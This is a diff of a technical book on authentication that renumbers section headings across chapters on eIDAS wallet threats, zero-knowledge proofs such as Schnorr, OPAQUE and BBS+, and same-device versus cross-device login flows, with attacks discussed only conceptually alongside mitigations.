 Five adversarial positions are relevant:
 
@@ -35343,7 +35345,7 @@ Five adversarial positions are relevant:
 | **Network Attacker** | Intercept, modify, or replay credential presentations | Man-in-the-middle on network or BLE | TLS 1.3 for OpenID4VP; BLE Secure Connections; nonce-based replay protection in every presentation request |
 | **Quantum Computer (future)** | Break BBS+ or ECDSA by solving discrete logarithm | Sufficiently large fault-tolerant quantum computer | BBS+ is not post-quantum secure — migration to lattice-based anonymous credentials is a long-term research direction; current deployments rely on the assumption that quantum computers capable of breaking BLS12-381 are at least 15–20 years away |
 
-##### 28.5.2 Attack Surface Summary
+##### 31.5.2 Attack Surface Summary
 
 | Attack Vector | Target | Severity | Mitigation | ARF Requirement |
 |:-------------|:-------|:---------|:----------|:---------------|
@@ -35359,7 +35361,7 @@ Five adversarial positions are relevant:
 | Side-channel (timing, power) | Unlinkability compromise | Low | Constant-time proof generation, random delays | SHOULD |
 | Quantum computer | All BBS+ security | Critical (future) | Crypto-agility layer; monitor NIST PQC standards | Not yet required |
 
-##### 28.5.3 Mitigation Strategies
+##### 31.5.3 Mitigation Strategies
 
 **Multi-party issuer key generation (MPC):** To eliminate single points of failure at the issuer, the ARF recommends distributing the issuer's BBS+ secret key across $n$ independent HSMs using threshold cryptography. Signing requires collaboration of at least $t$ parties — no single party ever materialises the full secret key. This approach is analogous to MPC-based ECDSA signing used in custody solutions (Fireblocks, Coinbase Prime), adapted for the pairing-based BBS+ scheme.
 
@@ -35367,7 +35369,7 @@ Five adversarial positions are relevant:
 
 **Credential migration protocol:** When a user replaces their device, credentials must be migrated securely. The ARF specifies a seven-step protocol: (1) authenticate to old wallet via biometric + PIN, (2) generate encrypted migration package sealed to new device's public key, (3) transfer to new device via direct device-to-device or cloud backup, (4) authenticate user on new device, (5) contact issuer to re-bind each credential to new device key, (6) issuer verifies user identity via national eID and issues new BBS+ signatures with the new device key as binding attribute, (7) old wallet deletes all credentials after migration confirmation. Step 6 is critical: the issuer must re-sign the credential with the new device key, ensuring old device keys are invalidated.
 
-##### 28.5.4 Post-Quantum Considerations
+##### 31.5.4 Post-Quantum Considerations
 
 BBS+ security relies on the hardness of the discrete logarithm problem in pairing-friendly elliptic curve groups. A sufficiently large quantum computer running Shor's algorithm would break BBS+ entirely — the same applies to ECDSA-AC, since both constructions depend on elliptic curve discrete logarithms.
 
@@ -35471,7 +35473,7 @@ flowchart TD
 ```
 
 #### 32.1 ZKP Fundamentals for Authentication (Schnorr, Sigma Protocols)
-##### 31.1.1 Zero-Knowledge Proof Definition
+##### 32.1.1 Zero-Knowledge Proof Definition
 
 A zero-knowledge proof system for a statement $S$ satisfies three properties:
 
@@ -35504,7 +35506,7 @@ The subscript $c$ denotes computational indistinguishability. The verifier learn
 
 </details>
 
-##### 31.1.2 The Schnorr Identification Protocol
+##### 32.1.2 The Schnorr Identification Protocol
 
 The Schnorr identification protocol (Schnorr, 1989) is the prototypical zero-knowledge proof for authentication. It proves knowledge of a discrete logarithm — the prover demonstrates that they know the private key $x$ corresponding to a public key $Y = g^x$ without revealing $x$.
 
@@ -35670,7 +35672,7 @@ This is the **extraction** property: if a prover can succeed with non-negligible
 
 </details>
 
-##### 31.1.3 Sigma Protocols (Σ-Protocols)
+##### 32.1.3 Sigma Protocols (Σ-Protocols)
 
 Sigma protocols are a generalisation of the Schnorr identification protocol — a class of three-move (commit → challenge → response) honest-verifier zero-knowledge proof protocols that share the same structural pattern. The name "Sigma" derives from the Greek letter Σ, whose shape resembles the three-message flow between prover and verifier.
 
@@ -35735,7 +35737,7 @@ The prover runs two Σ-protocols in parallel and concatenates the challenges. If
 
 </details>
 
-##### 31.1.4 Non-Interactive Zero-Knowledge Proofs (NIZK) and the Fiat-Shamir Heuristic
+##### 32.1.4 Non-Interactive Zero-Knowledge Proofs (NIZK) and the Fiat-Shamir Heuristic
 
 Interactive ZKPs require real-time communication between prover and verifier — the verifier must send a fresh random challenge. For most authentication applications, this interaction is impractical or unnecessary. The **Fiat-Shamir heuristic** (Fiat and Shamir, 1986) transforms any interactive Σ-protocol into a non-interactive zero-knowledge proof (NIZK) by replacing the verifier's random challenge with a cryptographic hash of the prover's commitment:
 
@@ -35785,7 +35787,7 @@ Ed25519 is a concrete instantiation of the Schnorr signature scheme on the twist
 </details>
 
 #### 32.2 ZKP-Based Credential Verification
-##### 31.2.1 OPAQUE: Oblivious PAKE for Password Authentication
+##### 32.2.1 OPAQUE: Oblivious PAKE for Password Authentication
 
 OPAQUE (RFC 9807, published July 2025) is an **asymmetric Password-Authenticated Key Exchange (aPAKE)** protocol in which the server never sees the user's plaintext password — not during registration, not during authentication, not ever. OPAQUE represents the strongest known construction for password-based authentication, providing protection against offline dictionary attacks, server compromise, pre-computation attacks, and phishing.
 
@@ -35971,7 +35973,7 @@ where $t$ is the time parameter, $m$ is the memory cost, and $p$ is the parallel
 
 </details>
 
-##### 31.2.2 OPAQUE vs. SRP vs. Traditional Password Hashing
+##### 32.2.2 OPAQUE vs. SRP vs. Traditional Password Hashing
 
 | Property | OPAQUE (RFC 9807) | SRP (RFC 2945 / 5054) | Traditional hashing (bcrypt / Argon2) |
 |:---------|:------------------|:---------------------|:--------------------------------------|
@@ -36009,7 +36011,7 @@ OPAQUE is the natural evolution of password-based authentication (§9): it prese
 | **1Password** | Evaluating | Considering OPAQUE as successor to SRP for end-to-end encryption |
 | **Cloudflare access control** | Beta | OPAQUE-based zero-trust access without passwords visible to server |
 
-##### 31.2.3 AnonCreds: Privacy-Preserving Verifiable Credentials
+##### 32.2.3 AnonCreds: Privacy-Preserving Verifiable Credentials
 
 Hyperledger AnonCreds is a privacy-preserving anonymous credential scheme that provides **selective disclosure**, **predicate proofs**, and **holder unlinkability** — three properties that conventional credential formats (X.509 certificates, SD-JWT) cannot simultaneously achieve.
 
@@ -36043,7 +36045,7 @@ The trajectory is clear: AnonCreds is migrating from CL-signatures to BBS+ for p
 #### 32.3 Range Proofs and Predicate Proofs
 Range proofs and predicate proofs extend zero-knowledge techniques beyond binary "I know a secret" statements to quantitative assertions about credential attributes. These proofs are the cryptographic mechanism that enables the privacy-preserving age verification, income verification, and eligibility checking use cases that motivate much of the identity industry's interest in ZKPs.
 
-##### 31.3.1 Range Proofs
+##### 32.3.1 Range Proofs
 
 A range proof is a ZKP that a committed value lies within a specific range without revealing the value itself. The canonical use case: prove that `age ∈ [18, 120]` without revealing the actual age.
 
@@ -36139,7 +36141,7 @@ flowchart LR
     style Res text-align:left
 ```
 
-##### 31.3.2 Predicate Proofs
+##### 32.3.2 Predicate Proofs
 
 Predicate proofs generalise range proofs to arbitrary conditions on credential attributes:
 
@@ -36151,7 +36153,7 @@ Predicate proofs generalise range proofs to arbitrary conditions on credential a
 | **Non-revocation** | "Credential is not revoked" | Prove that the credential's serial number is not in the revocation accumulator — without revealing the serial number |
 | **Boolean combination** | `(age ≥ 18) AND (nationality ∈ EU)` | Compose multiple predicates with AND/OR logic |
 
-##### 31.3.3 Integration with Anonymous Credential Schemes
+##### 32.3.3 Integration with Anonymous Credential Schemes
 
 Range and predicate proofs achieve their full utility when integrated with anonymous credential schemes (§31). The combined protocol:
 
@@ -36177,7 +36179,7 @@ This is the architecture that the eIDAS 2.0 ecosystem is evaluating for privacy-
 **Balance verification in financial authentication.** A banking application must verify that a user has sufficient funds for a transaction amount $A$ without revealing the balance $B$: (1) create a Pedersen commitment $C_B = g^B \cdot h^{r_B}$ to the balance; (2) prove $B - A \geq 0$ using a range proof on $(B - A)$; (3) present the commitment and range proof. The verifier confirms sufficient funds without learning the exact balance — particularly relevant for privacy-preserving open banking APIs and cryptocurrency applications.
 
 #### 32.4 Privacy-Preserving Identity Verification
-##### 31.4.1 World ID and the Semaphore Protocol
+##### 32.4.1 World ID and the Semaphore Protocol
 
 World ID (Worldcoin) uses zero-knowledge proofs to solve a problem that conventional authentication cannot address: proving **unique humanness** without revealing identity. The system enables a user to prove "I am a unique human who has registered in the World ID registry" without revealing which specific human they are — even across multiple verifications.
 
@@ -36324,7 +36326,7 @@ flowchart LR
 
 **Controversy and regulatory scrutiny:** World ID's iris scanning enrollment raises substantial privacy concerns. Despite the ZKP layer's strong mathematical privacy guarantees, the biometric data collection itself — capturing iris images with dedicated hardware — has faced regulatory investigation in multiple jurisdictions (Kenya suspended operations in 2023; Spain, France, and Germany have initiated inquiries). The World Foundation introduced "Personal Custody" in 2024, allowing users to store verification data locally on their devices rather than on centralised servers. By early 2026, the system has registered over 12 million World IDs.
 
-##### 31.4.2 zk-Email: Zero-Knowledge Proofs over DKIM Signatures
+##### 32.4.2 zk-Email: Zero-Knowledge Proofs over DKIM Signatures
 
 zk-Email uses zero-knowledge proofs to prove properties of email-based identity without revealing the email content. The construction leverages **DKIM (DomainKeys Identified Mail)** — a standard email authentication protocol where the sending mail server digitally signs outgoing emails with the domain's private key, and recipients can verify the signature using the domain's public key published in DNS.
 
@@ -36367,7 +36369,7 @@ flowchart LR
 
 **Security considerations:** zk-Email's security relies on the integrity of DKIM key management. If a domain's DKIM private key is compromised, forged emails could produce valid proofs. The zk-email project maintains an on-chain registry of DKIM public keys to reduce reliance on potentially manipulable DNS lookups, mitigating DNS spoofing attacks.
 
-##### 31.4.3 zkLogin: OAuth-to-Blockchain Identity Bridging
+##### 32.4.3 zkLogin: OAuth-to-Blockchain Identity Bridging
 
 zkLogin (developed for the Sui blockchain) uses zero-knowledge proofs to bridge OAuth-based identity systems (Google, Facebook, Apple) to blockchain addresses, hiding the mapping between the OAuth identity and the on-chain address.
 
@@ -36380,7 +36382,7 @@ zkLogin (developed for the Sui blockchain) uses zero-knowledge proofs to bridge 
 
 **Privacy property:** zkLogin prevents third parties from linking a blockchain address to its corresponding OAuth identifier. A user can authenticate with their Google account to authorise blockchain transactions, but external observers (including other blockchain participants) cannot determine that "address 0x1234..." belongs to "user@gmail.com."
 
-##### 31.4.4 The Gap Between Cryptographic Possibility and Deployed Systems
+##### 32.4.4 The Gap Between Cryptographic Possibility and Deployed Systems
 
 The ZKP systems described in this chapter — Σ-protocols, OPAQUE, BBS+ credentials, Bulletproofs range proofs, Semaphore membership proofs, zk-Email, zkLogin — demonstrate that zero-knowledge cryptography can prove virtually any statement about credentials and identity attributes without revealing the underlying data. The mathematical theory is mature, the constructions are provably secure, and reference implementations exist in production.
 
@@ -36399,7 +36401,7 @@ Yet current mainstream authentication systems — WebAuthn (§14), TOTP (§12), 
 Current mainstream authentication is a 3–5 year horizon from meaningful ZKP adoption. The inflection point will likely be the convergence of three factors: (1) standardisation of BBS+ signatures at the IETF, (2) eIDAS 2.0 wallet deployments creating demand for unlinkable credential presentations, and (3) hardware-accelerated ZKP proving reaching sub-millisecond latency on consumer devices.
 
 #### 32.5 ZKP Deployments and Proof System Landscape
-##### 31.5.1 EdDSA Signatures as Deployed ZKPs
+##### 32.5.1 EdDSA Signatures as Deployed ZKPs
 
 The simplest and most widely deployed "ZKP in authentication" is the EdDSA signature scheme. While signatures are not typically classified as ZKPs in the theoretical sense, they are non-interactive zero-knowledge proofs of knowledge of a private key (via the Fiat-Shamir transform applied to the Schnorr protocol):
 
@@ -36415,7 +36417,7 @@ The simplest and most widely deployed "ZKP in authentication" is the EdDSA signa
 
 The ubiquity of EdDSA means that billions of authentication events per day rely on the Schnorr ZKP construction, even though it is not typically described as a ZKP in product documentation.
 
-##### 31.5.2 Blockchain Privacy Systems
+##### 32.5.2 Blockchain Privacy Systems
 
 Several major blockchain systems deploy ZKPs for privacy-preserving transactions, where "authentication" takes the form of proving transaction validity without revealing the transacting parties or amounts:
 
@@ -36547,7 +36549,7 @@ This chapter provides a systematic classification of authentication flow topolog
 #### 33.1 Same-Device Flows (Redirect, Pop-up, Embedded WebView)
 Same-device authentication flows execute the entire authentication ceremony on the device that initiated the access request. The user's browser or native application on Device A communicates with the Identity Provider (IdP), and the authentication result is delivered directly to the application on Device A — no second device is involved.
 
-##### 32.1.1 Redirect-Based Flows
+##### 33.1.1 Redirect-Based Flows
 
 The redirect-based flow is the canonical OAuth 2.0 / OIDC authentication pattern (§3). The application redirects the user's browser to the IdP's authorization endpoint; the user authenticates at the IdP's login page; the IdP redirects the browser back to the application with an authorization code (or, in legacy deployments, a token fragment).
 
@@ -36572,7 +36574,7 @@ When the redirect flow uses PKCE (RFC 7636) — mandatory for public clients und
 
 For native and desktop applications without a server-side component, OAuth 2.0 for Native Apps (RFC 8252, §11.3) specifies a loopback redirect mechanism: the client starts a local HTTP server on a random port, registers `http://127.0.0.1:\{port\}/callback` as the redirect URI, and the browser redirects to localhost after authentication. This provides strong isolation — only the application that started the loopback server can receive the callback. Loopback redirects are supported by all major OAuth authorization servers and are the recommended redirect mechanism for CLI tools and desktop applications that cannot register a custom URI scheme or universal link.
 
-##### 32.1.2 Pop-up/New Window Flows
+##### 33.1.2 Pop-up/New Window Flows
 
 Authentication opens in a separate browser window or pop-up while the original application page remains visible in the background. Google's "Sign in with Google" frequently uses this pattern — a small pop-up window appears for credential selection and consent, then closes automatically after authentication completes.
 
@@ -36604,7 +36606,7 @@ window.addEventListener('message', (event) => \{
 
 Pop-up blockers in modern browsers suppress `window.open()` calls that are not triggered by a direct user gesture (click or touch) in the synchronous call stack. Any asynchronous work (`fetch`, `setTimeout`) between the user gesture and the `window.open()` call will cause the pop-up to be blocked. Safari has particularly aggressive pop-up blocking and may suppress pop-ups even with user gestures in certain configurations. Applications should detect blocked pop-ups (by checking whether the opened window reference is `null` or has zero dimensions) and gracefully fall back to a full redirect-based flow when pop-up authentication is unavailable.
 
-##### 32.1.3 Embedded WebView/In-App Browser
+##### 33.1.3 Embedded WebView/In-App Browser
 
 When a native mobile application needs to authenticate the user via an IdP's web-based login page, it must render a browser component within the application. The choice of browser component has profound security implications.
 
@@ -36683,7 +36685,7 @@ Cross-device authentication involves two separate devices: **Device A** (the dev
 
 Cross-device flows exist because the device requesting access may not have the credentials needed for authentication. A user's laptop may not have a registered passkey, but their phone does. A smart TV has no biometric sensor, but the user's phone does. The cross-device pattern bridges the capability gap between the requesting device and the authenticating device.
 
-##### 32.2.1 QR Code Flows
+##### 33.2.1 QR Code Flows
 
 Device A displays a QR code containing a session identifier, a URL, or connection metadata. The user scans the QR code with Device B's camera. Device B authenticates the user and communicates the result to the server, which then grants access to Device A.
 
@@ -36741,7 +36743,7 @@ flowchart TD
     style Auth text-align:left
 ```
 
-##### 32.2.2 Push Notification Flows
+##### 33.2.2 Push Notification Flows
 
 The server sends a push notification to Device B (the user's registered smartphone). Device B's authenticator app presents the authentication UI — a biometric prompt, number matching challenge, or approval dialog. The user approves, and Device B sends the approval signal to the server, which grants access to Device A.
 
@@ -36749,7 +36751,7 @@ This is the standard enterprise MFA pattern — Microsoft Authenticator, Duo, Ok
 
 **Security enhancement — number matching:** To mitigate MFA fatigue attacks (§22.7 — attackers bombarding the user with push notifications until they reflexively approve one), modern push MFA requires the user to match a number displayed on Device A with the number shown in the push notification on Device B. Microsoft Authenticator enforced mandatory number matching from February 2023.
 
-##### 32.2.3 BLE (Bluetooth Low Energy)
+##### 33.2.3 BLE (Bluetooth Low Energy)
 
 Device A and Device B establish a BLE connection. BLE's limited range (~10 metres) provides a physical proximity proof — Device B must be near Device A. The proximity requirement defends against remote attackers who have stolen credentials or session tokens — the attacker would need physical proximity to complete the authentication ceremony.
 
@@ -36758,7 +36760,7 @@ The FIDO2 hybrid transport (§33.4) uses BLE as the proximity channel. The actua
 #### 33.3 QR Code Authentication: Custom-Rendered vs. Protocol-Standard
 QR code-based authentication appears across many products and protocols, but the implementations differ dramatically in their standardisation, security properties, and interoperability.
 
-##### 32.3.1 Custom QR Code Authentication
+##### 33.3.1 Custom QR Code Authentication
 
 Each service implements its own QR code format, session linking protocol, and security measures. There is no interoperability — WhatsApp's QR code protocol is entirely different from WeChat's, which differs from a banking app's.
 
@@ -36776,7 +36778,7 @@ Each service implements its own QR code format, session linking protocol, and se
 - Common vulnerabilities include session fixation (attacker pre-generates a QR code and tricks the user into scanning it), replay attacks (re-using captured QR code data), and insufficient session token entropy
 - No origin binding — the QR code protocol does not cryptographically bind the authentication to a specific relying party origin, unlike WebAuthn
 
-##### 32.3.2 Protocol-Standard QR Code Authentication (FIDO2 Hybrid Transport)
+##### 33.3.2 Protocol-Standard QR Code Authentication (FIDO2 Hybrid Transport)
 
 WebAuthn and CTAP2 define a standardised cross-device authentication protocol using QR codes combined with BLE proximity verification. This is the protocol-standard mechanism behind the "Use a passkey from another device" prompt in Chrome, Safari, and Edge.
 
@@ -36785,7 +36787,7 @@ The FIDO2 hybrid transport flow is detailed in §33.4.
 **Key difference from custom QR code flows:** The FIDO2 hybrid transport provides origin binding (the WebAuthn assertion is signed over the RP's origin — phishing-resistant), BLE proximity verification (Device B must be physically near Device A), and an encrypted cloud-assisted tunnel (the assertion is encrypted in transit). Custom QR code implementations rarely provide all three properties.
 
 #### 33.4 BLE-Based Authentication and Proximity Verification
-##### 32.4.1 FIDO2 CTAP2 Hybrid Transport (caBLE v2)
+##### 33.4.1 FIDO2 CTAP2 Hybrid Transport (caBLE v2)
 
 The CTAP2 hybrid transport — historically known as cloud-assisted BLE (caBLE) — is the standardised protocol for cross-device FIDO2 authentication. Specified in CTAP 2.2 (published as a FIDO Alliance Proposed Standard in July 2025), hybrid transport enables a platform authenticator on one device (e.g., a smartphone's passkey) to authenticate sessions on another device (e.g., a laptop browser).
 
@@ -37044,11 +37046,11 @@ flowchart TD
     style Sign text-align:left
 ```
 
-##### 32.4.2 Remembered Device Flow
+##### 33.4.2 Remembered Device Flow
 
 After a successful first-time QR-based cross-device authentication, Device B stores the connection metadata (including a long-term key derived from the QR secret exchange). For subsequent authentications, Device B can broadcast a BLE advertisement that Device A recognises — initiating the cross-device flow automatically without requiring another QR code scan. This "remembered device" mechanism significantly reduces friction for repeat cross-device authentications — the user sees a prompt on their phone and approves with a biometric, without scanning a QR code.
 
-##### 32.4.3 BLE Proximity: Security Analysis
+##### 33.4.3 BLE Proximity: Security Analysis
 
 BLE proximity is not a cryptographic guarantee — it is a probabilistic physical constraint. Security considerations:
 
@@ -37067,7 +37069,7 @@ BLE proximity is not a cryptographic guarantee — it is a probabilistic physica
 
 BLE relay attacks are the most challenging threat vector. In a relay attack, an attacker positions a relay device near the victim's phone and a second relay device near the victim's desktop. The relay forwards BLE messages between the two locations, making the phone believe the desktop is nearby (and vice versa). Comprehensive threat analyses of BLE relay attack surfaces (Ryan, IEEE S&P Workshop on IoT Privacy and Trust 2013) have catalogued a range of relay and impersonation vectors. Beyond CTAP2's timing constraints, more advanced defences include **distance bounding protocols** — cryptographic protocols that establish an upper bound on the physical distance between two devices by measuring the time-of-flight of challenge-response messages at the speed of light (Drimer and Murdoch, ACM CCS 2007). These protocols are inherently relay-resistant because the speed-of-light constraint cannot be violated by any relay technology.
 
-##### 32.4.4 Alternative Proximity Technologies
+##### 33.4.4 Alternative Proximity Technologies
 
 | Technology | Range | Security Property | Status |
 |:-----------|:------|:-------------------|:-------|
@@ -37081,7 +37083,7 @@ UWB is the most promising alternative to BLE for proximity verification. Unlike 
 #### 33.5 Hybrid Flows (Cross-Device with Same-Device Fallback)
 Modern authentication UX does not force the user to choose between same-device and cross-device flows upfront. Instead, the system automatically selects the optimal flow based on the available credentials on the user's current device.
 
-##### 32.5.1 Conditional UI and Automatic Flow Selection
+##### 33.5.1 Conditional UI and Automatic Flow Selection
 
 WebAuthn's Conditional UI / autofill mechanism (§14.8) enables seamless flow selection:
 
@@ -37091,7 +37093,7 @@ WebAuthn's Conditional UI / autofill mechanism (§14.8) enables seamless flow se
 
 The Conditional UI API surfaces all available options simultaneously — the browser's native credential picker shows local passkeys (same-device), previously-paired phones (cross-device, remembered), and "Use a different device" (cross-device, QR). The user selects the option that matches their current situation.
 
-##### 32.5.2 Progressive Device Linking
+##### 33.5.2 Progressive Device Linking
 
 After a successful cross-device authentication, the RP can offer to create a **same-device passkey** on Device A — progressively upgrading the user from a cross-device flow (higher friction) to a same-device flow (lower friction) for future authentications.
 
@@ -37134,7 +37136,7 @@ flowchart TD
 
 This progressive enhancement pattern is critical for passkey adoption. A user who initially has passkeys only on their phone can gradually accumulate same-device passkeys on every device they use — each cross-device authentication becomes an opportunity to create a local credential that eliminates cross-device friction for future sessions.
 
-##### 32.5.3 Enterprise Considerations
+##### 33.5.3 Enterprise Considerations
 
 IT policies may mandate specific flow topologies based on device trust level and operational context:
 
@@ -37145,11 +37147,11 @@ IT policies may mandate specific flow topologies based on device trust level and
 Conditional Access policies (§28.4) can enforce these topology requirements — for example, a policy can require phishing-resistant MFA from a compliant device for same-device flows while allowing cross-device flows from any device with specific authentication strength requirements.
 
 #### 33.6 Device Authorization Grant (RFC 8628) for Limited-Input Devices
-##### 32.6.1 Problem Statement
+##### 33.6.1 Problem Statement
 
 Devices with limited input capabilities — smart TVs, gaming consoles, IoT devices, digital signage, CLI tools — cannot render a browser-based login page or accept complex user input. A smart TV has no physical keyboard for typing an email address and password. A CLI tool running in a headless server environment has no browser for rendering an OAuth consent screen. These devices need a mechanism to authenticate the user without requiring the user to interact directly with the limited-input device.
 
-##### 32.6.2 Protocol Flow (RFC 8628)
+##### 33.6.2 Protocol Flow (RFC 8628)
 
 The OAuth 2.0 Device Authorization Grant (RFC 8628) solves this by separating the authentication ceremony from the device requesting access. The limited-input device initiates the flow by requesting a device code, then the user completes the authentication on a separate, full-capability device (their phone or laptop).
 
@@ -37338,7 +37340,7 @@ The **Authorization Server** securely responds to the device's next successful p
 
 The verification URL page is the user's primary touchpoint during the Device Authorization Grant — it is where they enter the code, authenticate, and grant consent. This page must accept the user code via a clear form input with inline validation, display the relying party identity (client name, logo) prominently so the user knows what they are authorising, show the requested scopes/permissions transparently, and provide real-time status feedback (pending, approved, denied, expired). For accessibility, the page must be screen-reader compatible and support keyboard navigation. If the device supports it, the `verification_uri_complete` parameter (with the user code pre-filled as a query parameter) should be encoded in a QR code to eliminate manual code entry entirely — this is particularly important for users with motor or visual impairments who may struggle with typing short alphanumeric codes.
 
-##### 32.6.3 Deployments
+##### 33.6.3 Deployments
 
 The Device Authorization Grant is widely deployed across consumer and developer platforms:
 
@@ -37353,7 +37355,7 @@ The Device Authorization Grant is widely deployed across consumer and developer 
 | **AWS CLI** | `aws sso login` (IAM Identity Center) | User visits the IAM Identity Center portal URL and enters the code |
 | **Kubernetes** | `kubectl` with OIDC provider | Device code flow for clusters using OIDC-based authentication |
 
-##### 32.6.4 Security Analysis
+##### 33.6.4 Security Analysis
 
 **Strengths:**
 
@@ -37372,7 +37374,7 @@ This attack is not theoretical. In February 2025, Microsoft disclosed that the R
 - **Context display** — the authorization server's consent page should clearly display: the application requesting access, the requested permissions (scope), and a warning that the user is authorising a device they should recognise. The user should be trained to reject consent requests they did not initiate
 - **Short code expiry** — the `user_code` and `device_code` should have short lifetimes (5–10 minutes) to limit the window for social engineering
 
-##### 32.6.5 CIBA Comparison
+##### 33.6.5 CIBA Comparison
 
 The Device Authorization Grant and Client-Initiated Backchannel Authentication (CIBA — §34) are both cross-device authentication patterns, but they operate in opposite directions:
 
@@ -37423,7 +37425,7 @@ Channel binding — cryptographically linking the authentication session to a sp
 #### 33.8 UX Design Patterns
 The user experience of authentication ceremonies varies dramatically across topologies. A redirect flow that feels seamless on desktop can be jarring on mobile; a QR code scan that is intuitive for a technical user can be baffling for a non-technical one. This section analyses the friction points, best practices, and progressive enhancement patterns for each topology.
 
-##### 32.8.1 Same-Device UX Patterns
+##### 33.8.1 Same-Device UX Patterns
 
 **Redirect flow UX.** The redirect provides the most seamless same-device UX on desktop — the user clicks "Sign in", the browser navigates to the IdP's login page, and after authentication the browser returns to the application. On mobile, the redirect may switch from a native app to the system browser and back, causing a visible context switch that users can find disorienting. In desktop SPAs, a full-page redirect loses the application's in-memory state unless preserved (e.g., in `sessionStorage`). If the IdP's login page is slow to load, the user may perceive the authentication as broken. Best practices include using `ASWebAuthenticationSession` (iOS) or Custom Tabs (Android) to provide a native-feeling browser experience that shares session state with the system browser, preserving application state before the redirect and restoring it on return, and showing a loading indicator during the redirect to avoid perceived dead time.
 
@@ -37431,13 +37433,13 @@ The user experience of authentication ceremonies varies dramatically across topo
 
 **Embedded WebView UX.** The WebView provides visual continuity — the authentication happens within the application's UI without any navigation. However, the WebView may render differently from the system browser (font sizes, layouts), autofill and password manager integration may not work, and users who are logged into the IdP in their system browser will have to log in again in the WebView (no shared cookies). These friction points, combined with the security risks documented in §33.1.3, explain why WebViews are prohibited for OAuth flows under RFC 9700.
 
-##### 32.8.2 Cross-Device UX Patterns
+##### 33.8.2 Cross-Device UX Patterns
 
 **QR code scanning UX.** QR code scanning is the most widely deployed cross-device pattern. The user sees a QR code on the screen, opens their phone's camera or a dedicated app, scans the code, reviews the authentication request, and approves. Friction points include the physical requirement to reach for and unlock the phone, lighting or distance making scanning difficult, and users unfamiliar with QR codes not understanding what to do. Best practices: display the QR code prominently with clear instructions ("Scan with your phone's camera"), show a countdown timer indicating the QR code's expiry, provide a clickable `verification_uri_complete` link as a fallback for users who cannot scan QR codes, animate the QR code refresh to indicate it is still live, and display the relying party name and identity on the phone after scanning so the user can verify they are approving the correct request.
 
 **Proximity pairing UX.** BLE-based proximity pairing (FIDO2 hybrid transport, §33.4) provides an automatic connection after the QR code scan — the phone detects the desktop device via BLE and establishes the encrypted tunnel without further user action beyond the initial biometric approval. Friction points include BLE pairing taking several seconds (during which the user waits), BLE failing if Bluetooth is disabled on either device, some desktop computers lacking Bluetooth radios, and users not understanding why Bluetooth permission is being requested. Best practices: clearly explain why Bluetooth is needed ("To verify your phone is nearby"), provide a non-BLE fallback for devices without Bluetooth, show a clear "Connecting..." state while BLE pairing is in progress, and time out gracefully if BLE pairing fails after a reasonable period (e.g., 30 seconds).
 
-##### 32.8.3 Progressive Enhancement Pattern
+##### 33.8.3 Progressive Enhancement Pattern
 
 A sophisticated authentication system implements **progressive enhancement**: it starts with the lowest-friction approach and falls back to higher-friction alternatives only when necessary. The progression follows four tiers:
 
@@ -37448,7 +37450,7 @@ A sophisticated authentication system implements **progressive enhancement**: it
 
 This pattern maximises UX while ensuring that authentication is always possible regardless of the device's capabilities. The progressive linking mechanism in §33.5.2 — where a successful cross-device authentication prompts the creation of a same-device passkey for future sessions — is the key enabler of this pattern: each cross-device authentication becomes an opportunity to upgrade to lower-friction same-device authentication.
 
-##### 32.8.4 Accessibility Considerations
+##### 33.8.4 Accessibility Considerations
 
 Authentication UX must accommodate users with disabilities. Each topology presents different accessibility challenges:
 
@@ -37465,23 +37467,23 @@ Key accessibility recommendations: always provide a non-QR-code fallback for cro
 #### 33.9 Platform-Specific Implementations
 Major platform vendors implement same-device and cross-device authentication with distinct architectural choices, reflecting their ecosystem constraints and security priorities. This section compares the Apple, Google, and Microsoft approaches.
 
-##### 32.9.1 Apple Ecosystem
+##### 33.9.1 Apple Ecosystem
 
 Apple's authentication ecosystem leverages tight integration between macOS, iOS, and watchOS. For OAuth flows, the recommended mechanism is `ASWebAuthenticationSession` (iOS) — a system-provided browser session that shares cookies with Safari but runs in a separate process, preventing the native app from inspecting the session content. Universal Links provide deep linking that always opens in the originating app (not the browser), preventing custom URI scheme hijacking. Apple's **proxied authentication** mechanism allows a macOS device to proxy a WebAuthn request to a nearby iPhone or Apple Watch — if the iPhone is nearby and unlocked, macOS can use the Apple Watch proximity API to proxy the request directly without a QR code scan.
 
 Apple Passkeys (introduced in iOS 16 and macOS Ventura) are FIDO2 credentials synced via iCloud Keychain. They support both same-device authentication (on the device where the passkey was created) and cross-device authentication (on any Apple device signed into the same iCloud account). Passkeys are stored in the Secure Enclave on each device, syncing uses iCloud Keychain's end-to-end encryption, and they are available via the system autofill mechanism — no embedded WebView needed.
 
-##### 32.9.2 Google Ecosystem
+##### 33.9.2 Google Ecosystem
 
 Google's authentication ecosystem centres on Google Accounts, passkeys synced via Google Password Manager, and the Chrome browser. Chrome's cross-device authentication flow works as follows: when a website initiates `navigator.credentials.get()` and Chrome finds no local passkey, Chrome displays a QR code. The user scans the QR code with their Android phone, authenticates with a passkey stored in Google Password Manager, and the phone sends the assertion back to Chrome via a cloud relay. Notably, Google's implementation does not use the FIDO2 hybrid transport's BLE proximity check — it relies on the security of the cloud relay channel and the phone's biometric verification. This means Google's cross-device flow is theoretically vulnerable to remote QR code scanning, though the practical risk is mitigated by the phone's biometric prompt showing the RP identity for user verification.
 
-##### 32.9.3 Microsoft Ecosystem
+##### 33.9.3 Microsoft Ecosystem
 
 Microsoft's authentication ecosystem centres on Entra ID (formerly Azure AD), Windows Hello, and the Microsoft Authenticator app. Windows Hello provides same-device passkey authentication on Windows 10/11: the user authenticates with a PIN, fingerprint, or facial recognition via the IR camera, and credentials are stored in the TPM (Trusted Platform Module). Windows Hello acts as a platform authenticator for WebAuthn.
 
 For cross-device authentication, Microsoft Authenticator provides push notifications with **number matching**: the user enters their username on the desktop, Entra ID sends a push notification to the Authenticator app on the user's phone displaying a two-digit number (e.g., "73"), the desktop displays the same number, and the user must type the number into the Authenticator app to approve. This number matching step prevents accidental approvals and defends against real-time phishing — the attacker does not see the number displayed on the legitimate device. Number matching has been mandatory in Microsoft Authenticator since February 2023.
 
-##### 32.9.4 Platform Comparison
+##### 33.9.4 Platform Comparison
 
 | Feature | Apple | Google | Microsoft |
 |:--------|:------|:-------|:----------|
@@ -37498,31 +37500,31 @@ For cross-device authentication, Microsoft Authenticator provides push notificat
 #### 33.10 Use Case Taxonomy
 Different deployment scenarios impose different constraints on authentication topology — a CLI tool running on a headless server has fundamentally different requirements from a native mobile app with biometric sensors. This section maps common use cases to recommended topologies.
 
-##### 32.10.1 CLI Tools and Developer Utilities
+##### 33.10.1 CLI Tools and Developer Utilities
 
